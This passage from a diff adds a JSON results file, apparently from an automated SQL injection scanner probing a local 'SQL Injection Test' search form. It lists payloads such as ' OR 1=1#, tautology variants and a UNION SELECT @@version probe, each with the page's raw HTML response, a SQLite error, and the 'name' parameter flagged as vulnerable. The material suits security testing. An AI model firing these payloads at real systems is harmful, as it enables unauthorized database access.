+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR 1=1#&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR '1'='1' ##",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR &#39;1&#39;=&#39;1&#39; ##&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR '1'='1' #",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR &#39;1&#39;=&#39;1&#39; #&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR '1'='1'## -",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR &#39;1&#39;=&#39;1&#39;## -&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": ")'",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;)&#39;&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;&#39;)&#39;&#39;&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "'",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39;&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;&#39;&#39;&#39;&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' or \"",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; or &#34;&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;&#34;&#39;&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' UNION SELECT 1, @@version, 3--",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; UNION SELECT 1, @@version, 3--&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;@&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 1=1#",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR 1=1#&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 1=1#",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR 1=1#&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR '1'='1' #",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR &#39;1&#39;=&#39;1&#39; #&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 1=1##",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR 1=1##&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 'a'='a'##",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR &#39;a&#39;=&#39;a&#39;##&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 1=1#",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR 1=1#&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 1=1## -",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR 1=1## -&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR '1'='1'## -",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR &#39;1&#39;=&#39;1&#39;## -&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 1=1#",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR 1=1#&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR '1'='1' ##",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR &#39;1&#39;=&#39;1&#39; ##&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR '1'='1' #",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR &#39;1&#39;=&#39;1&#39; #&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR '1'='1'## -",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR &#39;1&#39;=&#39;1&#39;## -&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        }
+    ]
+}
